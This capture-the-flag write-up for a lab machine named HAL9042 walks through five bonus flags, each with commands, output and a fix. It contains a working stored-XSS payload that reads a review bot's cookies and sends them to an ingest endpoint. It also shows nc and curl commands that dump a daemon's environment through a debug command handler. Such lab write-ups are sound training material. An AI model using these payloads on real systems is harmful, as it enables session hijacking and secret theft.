# Boot2root, HAL9042

## Bonus write-up: the 5 optional flags


## B1, xavier's leftover tool (`FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}`)

**How I got onto it.** The decrypted report (`rapport_final.enc`, mandatory step)
spends a whole section on "xavier, uid 1337, account deleted 48h after asking
about PROJET FORK" and keeps repeating *"deleted users leave traces, find me by
uid, not by name."* That's a direct instruction: search by numeric uid, because
a deleted account has no name left in `/etc/passwd` but its files still carry the
bare uid.

```bash
find / -uid 1337 2>/dev/null
/home/xavier
/var/backups/xbackup
/var/backups/.xavier_uid1337.bak
/tmp/.xn/...
```

`xbackup` is an ELF, owned by `1337`, **not** setuid (so it's not a privesc,
that's the trap). It's "a backup tool", and the `.bak` note literally says
*"strings it"*. The flag is a plain string compiled into the binary:

```bash
strings /var/backups/xbackup | grep FLAG
FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
```

Worth noting for the defence: the binary is unstripped and has a symbol
`xavier_recovery_token`. Dereferencing it (`gdb -batch -ex 'x/s &xavier_recovery_token'`,
or reading `.data`/`.rodata` with `objdump -s`) shows the pointer resolves to the
same flag string, it looks like a "recovery credential" but it's a red herring,
not a key to anything. I checked that before wasting time on it.

**Vulnerability:** data remanence, a deleted user's home, backups and tools were
left on disk, and a secret was hard-coded into a world-readable binary.

**Fix:** when offboarding an account, remove its files and backups, not just the
passwd entry. Never embed secrets in binaries (`strings` defeats it instantly).
Scrub `/tmp` and `/var/backups` of orphaned, uid-only files.

---

## B2, internal telemetry endpoint (`FLAG{b4sh_h1st0ry_1s_4_d14ry}`)

**How I got onto it.** Two breadcrumbs pointed here before I even had root:
`/api/internal/schema` leaked `host 127.0.0.1 / port 9000`-style internal service
details early on, and sophie's `.bash_history` had a literal
`curl -s "http://127.0.0.1:9000/internal/telemetry"  # F14 hint`. It's a loopback
HTTP service, so it's only reachable from on the box.

```bash
# from any shell on the box (it's loopback-only)
curl -s http://127.0.0.1:9000/internal/telemetry
FLAG{b4sh_h1st0ry_1s_4_d14ry}
```

The source (`/opt/hal9042/services/telemetry.py`) shows it just returns the `FLAG`
env var at a fixed path, no auth at all. The real port/path come from an
`EnvironmentFile` at runtime; `ss -tlnp` confirms the live port if it was changed
from the 9000 default.

**Vulnerability:** an unauthenticated internal endpoint that returns a secret to
anyone who can reach loopback, i.e. anyone with any foothold on the host.

**Fix:** "bound to 127.0.0.1" is not authentication once the box is
foothold-ed. Put real auth on internal endpoints, and don't serve secrets over
plain HTTP even internally.

---

## B3, the UDP "whisper" channel (`FLAG{udp_1s_4_wh1sp3r}`)

**How I got onto it.** `/opt/hal9042/services/whisper.py` (and a
`hal9042-whisper` systemd unit) describe a UDP service bound to `0.0.0.0:1337`,
reachable from Kali, not just loopback. The nice part: send it anything wrong and
it *tells you the handshake it wants*.

```bash
# poke it to read the hint
printf 'x' | nc -u -w2 192.168.81.129 1337
# to "expected handshake: KNOCK <hostname>"
```

The code builds the expected message as `MAGIC + " " + socket.gethostname()`, and
`MAGIC` defaults to `KNOCK`. The hint prints the real magic but leaves
`<hostname>` literal, so you supply the box's own hostname (`hal9042`):

```bash
printf 'KNOCK hal9042' | nc -u -w2 192.168.81.129 1337
FLAG{udp_1s_4_wh1sp3r}
```

Match is exact (`.strip()` only trims outer whitespace), so no trailing junk.

**Vulnerability:** a service that leaks its own auth scheme in an error message
and uses a static, guessable shared string as the only control.

**Fix:** never disclose the expected credential/format in error output; use real
authentication rather than a fixed "magic word", and don't expose the service on
all interfaces if it's meant to be internal.

---

## B4, daemon environment via the DEBUG channel (`FLAG{pr0c_kn0ws_4ll_s3cr3ts}`)

**How I got onto it.** Once I had the `DEBUG:` command handler on `hal9042d`
(`127.0.0.1:7042`, runs as wil, mandatory step), I had a way to run commands
inside the daemon's *own* process context. Services commonly stash secrets in
their environment (systemd `EnvironmentFile=`, etc.), and a process can always
read its own at `/proc/self/environ`., the point is to dump the whole environment and look.

First pass, just read everything (environ is NUL-separated, so turn the NULs into
newlines to make it legible):

```bash
echo 'DEBUG:tr "\0" "\n" < /proc/self/environ' | nc 127.0.0.1 7042
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=...
HAL_DEV_FLAG=FLAG{pr0c_kn0ws_4ll_s3cr3ts}      # <- spotted here
...
```

The flag is sitting in a variable called `HAL_DEV_FLAG`, discovered by reading
the dump, Once you've seen the name you can obviously narrow it.

**Vulnerability:** a secret passed through the process environment, exposed via
`/proc/<pid>/environ`, combined with the unauthenticated command handler that
lets you read it.

**Fix:** don't put secrets in environment variables of long-running services
(they're readable via `/proc` by the process and anything running as it, and
often leak into logs/crash dumps). Use a secrets manager or a tight-permission
file. And remove the DEBUG handler (already covered in the mandatory fixes).

---

## B5, stored XSS to the review bot's cookie (`FLAG{h4l_r3v13ws_3v3ry_4pp34l}`)

This is the flag that finally explains the `/api/ingest` rabbit hole from the very
first recon, so I'll walk the whole reasoning, it's the one place where a
throwaway observation early on turns out to be the entire exploit.

**Clue 1, ingest writes itself.** Back during recon, hitting `/api/ingest` with
no parameter dumps the stored feed, and it kept showing lines I never submitted:

```
review_open:1
review_open:2
review_open:3
...
```

From the app source, `/api/ingest` only stores what's POSTed with `c=`,
`INSERT INTO ingest(data) VALUES(?)`. 

**Clue 2, the app says it has a reviewer.** In `app.py`, `/appeal` (POST) stores
`reason` verbatim (no length cap, unlike `project[:120]`, no sanitising), and the
individual view renders it:

```python
@app.route("/appeal/<int:aid>")
def appeal_view(aid):
    row = c.execute("SELECT * FROM appeals WHERE id=?", (aid,)).fetchone()
    return render_template("appeal_view.html", appeal=row)   # reason rendered here
```

So `reason` is a classic stored-XSS candidate, *if* something opens the page. And
the decoy `/admin` route tells you something does, in scare-quotes:

```python
"Humans may file a grade appeal at /appeal. A human will 'review' it.\n"
```

"A human will `'review'` it" = HAL, i.e. an automated reviewer. And `/appeals`
conveniently lists the 50 newest appeal IDs, exactly what a bot would crawl.

**Clue 3, confirm the bot on the box.** Don't assume it; find it:

```bash
systemctl list-units --type=service | grep -i hal9042
#  hal9042-reviewer.service   HAL9042 grade-appeal reviewer (headless Chromium, optional F11)
systemctl cat hal9042-reviewer.service
#  User=halrev   APP_URL=http://127.0.0.1:5042   INTERVAL=12
#  ExecStart=/opt/hal9042/reviewer/venv/bin/python /opt/hal9042/reviewer/reviewer.py
```

There it is: a headless-Chromium reviewer running as `halrev` (uid 999, nologin),
hitting the app every 12 seconds. The directory is `halrev`-only
(`drwxr-x--- halrev halrev`), so I couldn't read `reviewer.py` until I was root,
but reading it isn't needed to *exploit* it (the exploit below is pure
remote/unauth); root just confirmed the logic:

```python
COOKIES = [
    {"name": "hal_session", "value": SESSION, "url": APP_URL, "httpOnly": False},
    {"name": "flag",        "value": FLAG,    "url": APP_URL, "httpOnly": False},
]
...
page.goto(APP_URL + "/appeals", ...)
for href in hrefs:                 # every <a href="/appeal/...">
    page.goto(APP_URL + href, ...)
```

That nails the whole thing down: the bot loads **a cookie literally named `flag`,
with `httpOnly: False`**, then visits `/appeals` and every `/appeal/<id>`. A
non-HttpOnly cookie is readable from JavaScript, and the bot walks straight into
any script stored in an appeal's `reason`.

**The exploit** (no root needed, do it as an outside attacker). Submit an appeal
whose `reason` reads `document.cookie` and ships it to `/api/ingest` (the sink
from clue 1):

```bash
curl -s -X POST http://192.168.81.129:5042/appeal \
  --data-urlencode 'project=re-eval' \
  --data-urlencode "reason=<img src=x onerror=\"fetch('/api/ingest?c='+encodeURIComponent(document.cookie))\">"
```

Wait one review cycle (≤12s) for the bot to open the appeal, then read the feed
back:

```bash
curl -s http://192.168.81.129:5042/api/ingest
# hal_session=hal-reviewer; flag=FLAG{h4l_r3v13ws_3v3ry_4pp34l}
```

The bot's own `flag` cookie comes back in the ingest feed. Done. 

So the real chain, every link evidenced: `review_open` noise in ingest to source shows `reason` stored + rendered on
`/appeal/<id>` and the `'review'` scare-quote to `systemctl` confirms the
headless-Chromium reviewer to `reviewer.py` shows a non-HttpOnly `flag` cookie and
the `/appeals`to`/appeal/<id>` crawl to stored XSS exfils that cookie through
`/api/ingest`.

**Vulnerability chain:** stored XSS (`reason` rendered without escaping) + an
automated headless browser that visits attacker-controlled content + a secret
carried in a **non-HttpOnly cookie** + an open, unauthenticated collection
endpoint (`/api/ingest`) to receive the exfil. Each one alone is minor; chained,
they hand a remote attacker a value only the review bot should ever hold.

**Fix:** escape `reason` on output (don't disable autoescaping / don't use
`|safe`) and validate it on input. Never put a secret in a cookie, and set
`HttpOnly` + `SameSite=Strict` on any session cookie so script can't read or send
it. Add a Content-Security-Policy to block inline/`onerror` handlers and outbound
`fetch` to arbitrary paths. Lock down or remove `/api/ingest`. And the reviewer
should browse with a hardened, least-privilege context, no meaningful secrets in
its cookie jar at all.

---

## Bonus flag inventory

| Flag | Source | Vuln class |
|------|--------|-----------|
| `FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}` | `strings /var/backups/xbackup` | data remanence / secret in binary |
| `FLAG{b4sh_h1st0ry_1s_4_d14ry}` | `127.0.0.1:9000/internal/telemetry` | unauth internal endpoint |
| `FLAG{udp_1s_4_wh1sp3r}` | UDP `1337`, `KNOCK hal9042` | static-secret auth / info leak |
| `FLAG{pr0c_kn0ws_4ll_s3cr3ts}` | `/proc/self/environ` via DEBUG on `7042` | secret in process env |
| `FLAG{h4l_r3v13ws_3v3ry_4pp34l}` | stored XSS `/appeal` to `/api/ingest` | XSS + non-HttpOnly cookie |

Common thread for the defence: none of these is an exotic bug. They're the same
"left it on, left it readable, trusted the network boundary" mistakes as the main
chain, just off to the side, a backup nobody deleted, two internal services
nobody authenticated, a secret in an env var, and a review bot trusting user HTML.
